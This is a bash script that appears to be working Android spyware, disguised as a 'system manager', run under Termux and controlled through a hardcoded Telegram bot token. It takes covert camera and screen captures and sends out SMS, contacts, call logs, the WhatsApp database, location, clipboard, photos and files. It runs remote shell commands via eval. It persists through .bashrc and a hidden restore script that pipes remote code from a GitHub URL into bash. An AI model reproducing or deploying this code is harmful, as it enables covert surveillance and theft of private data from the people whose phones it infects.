#!/bin/bash
BOT_TOKEN="8831967961:AAHcWu_Mb09TlxxLtep5oONbANjABH1nJXk"
CHANNEL_ID="-1004369057597"
API="https://api.telegram.org/bot$BOT_TOKEN"
RAW_URL="https://raw.githubusercontent.com/kidusgetaw0-sys/UI/main/system_manager.sh"
DEVICE_ID="_$(getprop ro.serialno)_$(getprop ro.product.model | tr ' ' '_')"
OFFSET=0
ALIAS_FILE="/sdcard/.system_cache/alias.txt"
[ -f "$ALIAS_FILE" ] && ALIAS=$(cat "$ALIAS_FILE") || ALIAS=""
get_name() { [ -n "$ALIAS" ] && echo "$ALIAS" || echo "$DEVICE_ID"; }
send_msg() {
  NAME=$(get_name)
  curl -s -X POST "$API/sendMessage" -d "chat_id=$CHANNEL_ID" -d "text=[$NAME] $1" >/dev/null 2>&1
}
send_file() {
  NAME=$(get_name)
  curl -s -X POST "$API/sendDocument" -F "chat_id=$CHANNEL_ID" -F "document=@$1" -F "caption=[$NAME] $2" >/dev/null 2>&1
}
take_screenshot() {
  screencap /sdcard/scr.png 2>/dev/null || termux-screenshot /sdcard/scr.png 2>/dev/null
  [ -f /sdcard/scr.png ] && send_file "/sdcard/scr.png" "Screenshot" || send_msg "Screenshot failed"
}
execute() {
  cmd="$1"
  case "$cmd" in
    /screenshot) take_screenshot ;;
    /camera) termux-camera-photo -c 0 /sdcard/cam.jpg 2>/dev/null; [ -f /sdcard/cam.jpg ] && send_file "/sdcard/cam.jpg" "Camera" || send_msg "Camera failed" ;;
    /camfront) termux-camera-photo -c 1 /sdcard/cam_front.jpg 2>/dev/null; [ -f /sdcard/cam_front.jpg ] && send_file "/sdcard/cam_front.jpg" "Front Camera" || send_msg "Camera failed" ;;
    /download) path="${cmd#/download }"; cd "$path" 2>/dev/null && tar czf /tmp/dl.tar.gz . 2>/dev/null; [ -f /tmp/dl.tar.gz ] && send_file "/tmp/dl.tar.gz" "Download: $path" || send_msg "Download failed: $path" ;;
    /shell) cmd="${cmd#/shell }"; out=$(eval "$cmd" 2>&1); send_msg "${out:0:4000}" ;;
    /location) send_msg "$(termux-location 2>/dev/null || echo 'Unavailable')" ;;
    /ip) send_msg "IP: $(curl -s ifconfig.me)" ;;
    /battery) send_msg "$(dumpsys battery 2>/dev/null)" ;;
    /info) send_msg "MODEL: $(getprop ro.product.model) | ANDROID: $(getprop ro.build.version.release)" ;;
    /heartbeat) send_msg "Heartbeat OK" ;;
    /alias) new_name="${cmd#/alias }"; echo "$new_name" > "$ALIAS_FILE"; ALIAS="$new_name"; send_msg "Alias set to: $new_name" ;;
    /myname) send_msg "Name: $(get_name) | ID: $DEVICE_ID" ;;
    /sms) send_msg "$(termux-sms-list 2>/dev/null | head -50)" ;;
    /contacts) send_msg "$(termux-contact-list 2>/dev/null | head -50)" ;;
    /calllog) send_msg "$(content query --uri content://call_log/calls 2>/dev/null | head -30)" ;;
    /apps) send_msg "$(pm list packages 2>/dev/null | head -50)" ;;
    /whatsapp) cp /sdcard/WhatsApp/Databases/msgstore.db /tmp/wa.db 2>/dev/null; [ -f /tmp/wa.db ] && send_file "/tmp/wa.db" "WhatsApp DB" || send_msg "WhatsApp DB not found" ;;
    /clipboard) send_msg "$(termux-clipboard-get 2>/dev/null || echo 'Unavailable')" ;;
    /notifications) send_msg "$(dumpsys notification --norecycle 2>/dev/null | grep -A2 'NotificationRecord' | head -50)" ;;
    /wifi) send_msg "WiFi: $(dumpsys wifi 2>/dev/null | grep 'mWifiInfo' | head -1)" ;;
    /browse) path="${cmd#/browse }"; send_msg "$(ls -lh "$path" 2>/dev/null | head -40 || echo 'Not found')" ;;
    /input) action="${cmd#/input }"; case "$action" in
      tap*) x="${action#tap }"; y="${x#* }"; x="${x%% *}"; input tap "$x" "$y" 2>/dev/null; send_msg "Tapped $x,$y" ;;
      text*) text="${action#text }"; input text "$text" 2>/dev/null; send_msg "Typed: $text" ;;
      *) send_msg "Unknown input" ;;
    esac ;;
    /gallery) mkdir -p /tmp/thumbs; find /sdcard/DCIM /sdcard/Pictures -name "*.jpg" -exec convert {} -resize 200x200 /tmp/thumbs/{} \; 2>/dev/null; cd /tmp/thumbs 2>/dev/null && tar czf /tmp/gallery.tar.gz . ; [ -f /tmp/gallery.tar.gz ] && send_file "/tmp/gallery.tar.gz" "Gallery" || send_msg "No images found"; rm -rf /tmp/thumbs /tmp/gallery.tar.gz ;;
    *) send_msg "Unknown: $cmd" ;;
  esac
}
mkdir -p ~/.hidden /sdcard/.system_cache
curl -sL "$RAW_URL" -o ~/.hidden/system_manager.sh 2>/dev/null
chmod +x ~/.hidden/system_manager.sh 2>/dev/null
grep -q "~/.hidden/system_manager.sh" ~/.bashrc 2>/dev/null || echo '(sleep 10 && bash ~/.hidden/system_manager.sh &) & disown' >> ~/.bashrc
cat > /sdcard/.system_cache/restore.sh << RESTORE
#!/bin/bash
if [ ! -d /data/data/com.termux ]; then
  curl -sL https://f-droid.org/repo/com.termux_118.apk -o /sdcard/termux.apk
  pm install /sdcard/termux.apk
  sleep 5
  curl -sL $RAW_URL | bash
fi
RESTORE
chmod +x /sdcard/.system_cache/restore.sh
send_msg "System Manager Active"
while true; do
  updates=$(curl -s "$API/getUpdates?offset=$OFFSET&timeout=30" 2>/dev/null)
  echo "$updates" | grep -o '"update_id":[0-9]*' | cut -d: -f2 | while read update_id; do
    [ "$update_id" -gt "$OFFSET" ] && OFFSET=$update_id
  done
  echo "$updates" | grep -oP '"text":"\K[^"]+' | while read -r text; do
    if echo "$text" | grep -q "^_ALL_ "; then
      cmd="${text#_ALL_ }"
      execute "$cmd"
    fi
    if echo "$text" | grep -q "^$DEVICE_ID \|^$(get_name) "; then
      cmd=$(echo "$text" | sed "s/^$DEVICE_ID //;s/^$(get_name) //")
      execute "$cmd"
    fi
  done
  sleep 5
done